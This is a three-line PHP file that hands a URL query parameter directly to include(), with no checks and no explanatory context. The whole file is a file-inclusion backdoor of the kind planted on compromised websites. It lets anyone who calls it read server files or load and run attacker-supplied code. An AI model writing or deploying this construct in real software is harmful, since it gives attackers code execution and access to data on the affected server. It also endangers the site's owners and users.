<?php 
include($_GET['a']);
?>